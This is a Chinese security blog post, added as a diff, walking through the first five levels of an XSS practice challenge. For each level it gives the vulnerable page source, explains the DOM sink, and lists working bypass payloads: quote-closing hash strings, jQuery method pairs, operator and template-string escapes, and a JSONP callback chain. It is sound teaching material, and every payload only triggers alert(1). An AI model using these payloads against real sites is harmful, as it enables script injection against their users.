@@ -1,0 +1,480 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,XSS,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>一些BAT的XSS实例 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        一些BAT的XSS实例
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-07-11T08:04:07.000Z">
+        2020-07-11
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>根据N年前的BAT的XSS实例出的10道题目，弹1即可成功。</p>
+<p>题目地址时从xsstest1~xsstest10：</p>
+<p><a href="http://px1624.sinaapp.com/test/xsstest1/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest1/</a></p>
+<p>参考答案：一些BAT的XSS实例（一）</p>
+<h2 id="0x01-xsstest1"><a href="#0x01-xsstest1" class="headerlink" title="0x01 xsstest1"></a>0x01 xsstest1</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest1/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest1/</a></p>
+<p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x=location.hash;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">aa</span><span class="params">(x)</span></span>&#123;&#125;;</span></span><br><span class="line"><span class="actionscript">setTimeout(<span class="string">"aa('"</span>+x+<span class="string">"')"</span>,<span class="number">100</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 1~</span><br></pre></td></tr></table></figure>
+<p>这就是一个典型的DOM型XSS。这里source点是location.hash，即获取URL的锚部分（从#号开始的部分），sink点是setTimeout()。</p>
+<p>关键绕过点在于闭合引号和括号即可。</p>
+<p>下面看3种常用的构造方法。</p>
+<p>更多的JS调试技巧可参考：<a href="https://www.toolmao.com/342.html" target="_blank" rel="noopener">https://www.toolmao.com/342.html</a></p>
+<h3 id="方法一：分析代码并在Console中构造调试"><a href="#方法一：分析代码并在Console中构造调试" class="headerlink" title="方法一：分析代码并在Console中构造调试"></a>方法一：分析代码并在Console中构造调试</h3><p>先来看下setTimeout()方法。</p>
+<p>setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。</p>
+<p>语法格式可以是以下两种：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(要执行的代码, 等待的毫秒数)</span><br><span class="line">setTimeout(JavaScript 函数, 等待的毫秒数)</span><br></pre></td></tr></table></figure>
+<p>我们正常弹框是这样的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="string">"alert(1)"</span>,<span class="number">0</span>)</span><br><span class="line">或</span><br><span class="line">setTimeout(alert(<span class="number">1</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>根据当前场景，给出一些可在Chrome Console中运行弹框的样式：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="string">"aa('',alert(1),'')"</span>,<span class="number">0</span>) <span class="comment">// 利用闭合</span></span><br><span class="line">setTimeout(<span class="string">"aa('');alert('1')"</span>,<span class="number">0</span>) <span class="comment">// 利用闭合</span></span><br><span class="line">setTimeout(<span class="string">"aa('');alert(1)//')"</span>,<span class="number">0</span>) <span class="comment">// 利用注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">setTimeout(<span class="string">"aa('"</span>+<span class="string">"',alert(1),'"</span>+<span class="string">"')"</span>,<span class="number">0</span>) <span class="comment">// 利用闭合</span></span><br><span class="line">setTimeout(<span class="string">"aa('"</span>+<span class="string">"');alert('1"</span>+<span class="string">"')"</span>,<span class="number">0</span>) <span class="comment">// 利用闭合</span></span><br><span class="line">setTimeout(<span class="string">"aa('"</span>+<span class="string">"');alert(1)//"</span>+<span class="string">"')"</span>,<span class="number">0</span>) <span class="comment">// 利用注释</span></span><br></pre></td></tr></table></figure>
+<p>直接给出一些构造成功的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#&apos;,alert(1),&apos;</span><br><span class="line">#&apos;);alert(&apos;1</span><br><span class="line">#&apos;);alert(1)//</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/1.png" alt=""></p>
+<h3 id="方法二：JavaScript断点调试"><a href="#方法二：JavaScript断点调试" class="headerlink" title="方法二：JavaScript断点调试"></a>方法二：JavaScript断点调试</h3><p>就是在Chrome的Console中打断点看当前变量值。</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/2.png" alt=""></p>
+<h3 id="方法三：基于报错的JS调试"><a href="#方法三：基于报错的JS调试" class="headerlink" title="方法三：基于报错的JS调试"></a>方法三：基于报错的JS调试</h3><p>即故意输入特殊字符，导致JS语法错误，从而可以根据错误信息去构造我们的payload。</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/3.png" alt=""></p>
+<h2 id="0x02-xsstest2"><a href="#0x02-xsstest2" class="headerlink" title="0x02 xsstest2"></a>0x02 xsstest2</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest2/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest2/</a></p>
+<p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 2~</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'display:none'</span> <span class="attr">id</span>=<span class="string">'xx'</span>&gt;</span>&amp;lt;img src=x onerror=alert(1)&amp;gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'button'</span> <span class="attr">value</span>=<span class="string">'test'</span> <span class="attr">onclick</span>=<span class="string">'alert("鍝堝搱锛岀偣杩欑帺鎰忔病鍟ョ敤鐨勶紒")'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">if</span>(vars)&#123;</span></span><br><span class="line"><span class="undefined">		aa(vars[0],vars[1])</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="actionscript">   	<span class="function"><span class="keyword">function</span> <span class="title">aa</span><span class="params">(x,y)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">"#xx"</span>)[x]($(<span class="string">"#xx"</span>)[y]());</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>同样是DOM型XSS。这里window.location.search是从问号 (?) 开始的 URL（查询部分），然后以’&amp;’符切分内容，最后将传入的前两个参数传到<code>$(&quot;#xx&quot;)[x]($(&quot;#xx&quot;)[y]());</code>中执行。</p>
+<p>我们知道，常见的JQuery操作DOM的形式为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    text() - 设置或返回所选元素的文本内容</span></span><br><span class="line"><span class="comment">    html() - 设置或返回所选元素的内容（包括 HTML 标记）</span></span><br><span class="line"><span class="comment">    val()  - 设置或返回表单字段的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#btn1"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"值为: "</span> + $(<span class="string">"#test1"</span>).text());</span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="string">"#btn2"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"值为: "</span> + $(<span class="string">"#test1"</span>).html());</span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="string">"#btn3"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"值为: "</span> + $(<span class="string">"#test2"</span>).val());</span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="string">"#btn4"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"值为："</span> + $(<span class="string">"#test3"</span>).attr(<span class="string">"href"</span>));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>更多的方法可参考：<a href="https://m.jb51.net/article/39099.htm" target="_blank" rel="noopener">https://m.jb51.net/article/39099.htm</a></p>
+<p>网上一个总结图：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/4.png" alt=""></p>
+<p>而上面执行的位置就是对id为xx的标签进行了两次DOM操作。我们知道前面img标签处是被HTML编码了，这里就涉及到一个点，<strong>就是text()函数会把HTML编码后的代码给解码回来</strong>。</p>
+<p>测试下就知道了：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/6.png" alt=""></p>
+<p>payload如下，第二个参数必须是text，第一个参数则可以是其他的一些可触发的方法即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?html&amp;text</span><br><span class="line">?prepend&amp;text</span><br><span class="line">?append&amp;text</span><br><span class="line">?before&amp;text</span><br><span class="line">?after&amp;text</span><br><span class="line">?constructor&amp;text</span><br><span class="line">?appendTo&amp;text</span><br><span class="line">?insertBefore&amp;text</span><br><span class="line">?insertAfter&amp;text</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/5.png" alt=""></p>
+<h2 id="0x03-xsstest3"><a href="#0x03-xsstest3" class="headerlink" title="0x03 xsstest3"></a>0x03 xsstest3</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a></p>
+<p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">			$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">	&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一看没输入点，应该是后台的代码看不到，比如PHP写的。</p>
+<p>这里就推测下JS的px变量是不是就是输入参数：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/7.png" alt=""></p>
+<p>虽然推测出变量px，但经过折腾发现会过滤<code>&lt;</code>、<code>&gt;</code>等特殊字符，且很多闭合的尝试都没成功弹框，原因都在于两处的输入点导致语法不满足就会报错。</p>
+<p>后面看了wp，考察点是JavaScript字符串运算符。</p>
+<p>payload如下，除了加减乘除，其他的运算符都可以（可参考<code>https://www.w3school.com.cn/js/js_operators.asp</code>）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?px=&apos;*alert(1)*&apos;</span><br><span class="line">?px=%27%2Balert(1)%2B%27</span><br><span class="line">?px=%27-alert(1)-%27</span><br><span class="line">?px=%27/alert(1)/%27</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/8.png" alt=""></p>
+<p>最后看下作者的源码：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/10.png" alt=""></p>
+<h2 id="0x04-xsstest4"><a href="#0x04-xsstest4" class="headerlink" title="0x04 xsstest4"></a>0x04 xsstest4</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest4/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest4/</a></p>
+<p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 4~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">			$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">	&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>和第三关是一样的，也是px参数，但是将常见运算符这些都过滤了：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/9.png" alt=""></p>
+<p>然而，因为出题人的疏忽，漏掉了一些运算符，如instanceof、in：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?px=%27instanceof%20alert(1)instanceof%20%27</span><br><span class="line">?px=%27in%20alert(1)in%20%27</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/11.png" alt=""></p>
+<p><strong>作者的预期解法</strong></p>
+<p>这个同步输出的问题，导致我们没有办法直接通过注释符来实现，因为同步输出会导致语法错误，并且这里还过滤了<code>/</code>符号。既然这样，就只能寻找一些前后闭合都一样的来构造，首先想到的是单双引号，这个能够实现将中间部分作为字符串来解析：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/12.png" alt=""></p>
+<p>但是问题在于，JavaScript中单引号和双引号这样的字符串中间是不能换行的，如果要换行就必须得在行末尾进行转义：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/13.png" alt=""></p>
+<p>但是此处场景的行末尾不是我们可控的，显然无法在末尾写入<code>\</code>。</p>
+<p>解题关键在于JavaScript模板字符串：</p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings</a></p>
+<p>模板字符串中间是可以包含换行的，所以只需要使用模板字符串将中间部分变为字符串解析就可以了。</p>
+<p>测试看看，在同步输出的场景确实能够进行闭合字符串利用：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/15.png" alt=""></p>
+<p>payload如下，注意闭合因为注释掉中间部分剩下后面的<code>)</code>和<code>}</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?px=&apos;;`;&#123;alert(&apos;1</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/14.png" alt=""></p>
+<p>最后看下作者的源码，就是在第三关的基础上加上了对几乎所有JS运算符的过滤：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/16.png" alt=""></p>
+<h2 id="0x05-xsstest5"><a href="#0x05-xsstest5" class="headerlink" title="0x05 xsstest5"></a>0x05 xsstest5</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest5/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/</a></p>
+<p>此题直接访问时看不到源码的，会直接跳转到访问JSONP接口<code>/user.php?callback=Give me xss bypass~</code>，将callback参数的内容直接返回到页面中。</p>
+<p>用Burp看到，JSONP接口响应的Content-Type为text/javascript，弹框是没戏的，考察点不在这里，在之前的<a href="http://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#application-javascript%E4%B8%8Etext-javascript">《JSONP跨域漏洞总结》</a>中有提到过：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/17.png" alt=""></p>
+<p>回过来，看源码还是有办法的，直接访问<code>view-source:http://px1624.sinaapp.com/test/xsstest5/</code>即可：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pagenum= $.Tjs_Get(<span class="string">'pn'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback=Give me xss bypass~"</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> 	<span class="attr">src</span>=<span class="string">"http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>');</span></span></span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Give me xss bypass 5~</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里有个JQuery的Tjs_Get()方法，但是不知道具体定义实现，看到有引入index.js，下载该文件全局搜索，关键代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">Tjs_Get					得到地址栏中的参数值 变量分大小写</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 得到地址栏中的参数值 变量分大小写</span></span><br><span class="line">		Tjs_Get:<span class="function"><span class="keyword">function</span>(<span class="params">parmtname</span>)</span>&#123;</span><br><span class="line">			<span class="comment">//var SERVER_TEMP			= $.Tjs_HtmlEncode(window.location.search.replace(/.*\?/,"")); //HtmlEncode 进行安全验证</span></span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">			<span class="keyword">var</span> sl = location.href.indexOf(<span class="string">'&amp;'</span>);</span><br><span class="line">			<span class="keyword">var</span> hl = location.href.indexOf(<span class="string">'#'</span>);</span><br><span class="line">			<span class="keyword">var</span> str = <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">if</span> ((sl &lt; <span class="number">0</span> || sl &gt; hl) &amp;&amp; hl &gt; <span class="number">0</span>) str = location.hash.substr(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> str = location.search.substr(<span class="number">1</span>);</span><br><span class="line">			</span><br><span class="line">			str=str.replace(<span class="regexp">/%/g</span>,<span class="string">""</span>);</span><br><span class="line">			<span class="comment">//var SERVER_TEMP = str;</span></span><br><span class="line">			<span class="keyword">var</span> SERVER_TEMP			= $.Tjs_HtmlEncode(str.replace(<span class="regexp">/.*\?/</span>,<span class="string">""</span>)); <span class="comment">//HtmlEncode 进行安全验证</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">var</span> PAGE_PARMT_ARRAY	= SERVER_TEMP.split(<span class="string">"&amp;amp;"</span>);</span><br><span class="line">			<span class="keyword">if</span>(PAGE_PARMT_ARRAY.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">			<span class="keyword">var</span> value=<span class="string">""</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;PAGE_PARMT_ARRAY.length;i++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(PAGE_PARMT_ARRAY[i]==<span class="string">""</span>) <span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">var</span> GETname = PAGE_PARMT_ARRAY[i].substr(<span class="number">0</span>,PAGE_PARMT_ARRAY[i].indexOf(<span class="string">"="</span>));</span><br><span class="line">				<span class="keyword">if</span>(GETname == parmtname)&#123;</span><br><span class="line">					value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf(<span class="string">"="</span>)+<span class="number">1</span>),PAGE_PARMT_ARRAY[i].length);</span><br><span class="line">					<span class="keyword">return</span> value;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">		&#125;,</span><br></pre></td></tr></table></figure>
+<p>简单点说，就是获取GET方式传入的参数而已。</p>
+<p>回到源码处，有个document.write()的DOM操作，其中分别将uin和pn参数的值分别作为script标签src属性值URL的路径和参数部分传入。前面知道JSONP接口传入啥返回JS类的啥，比如<code>http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)</code>：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/18.png" alt=""></p>
+<p>这样就可以利用这个接口来构造如下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/19.png" alt=""></p>
